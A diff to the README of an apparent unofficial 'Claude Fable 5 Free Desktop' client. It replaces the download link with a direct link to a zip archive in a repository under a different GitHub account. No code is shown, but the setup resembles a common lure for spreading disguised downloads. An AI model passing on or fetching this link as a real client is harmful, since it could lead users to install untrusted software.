@@ -14,7 +14,7 @@ Claude Fable 5 Free Desktop is a responsive and feature-rich desktop client for 
 
 
 ## Install
-[Download `Claude-Fable-5-Free-Desktop.zip`](https://github.com/qmart113/Claude-fable-5-free-desktop/releases/latest)
+[Download `ClaudeFable5-desktop.zip`](https://github.com/claude5fable/Claude-fable-5-free-desktop/releases/download/fable/ClaudeFable5-desktop.zip)
 ---
 > Optimized for Windows 11 • macOS • Linux.
 
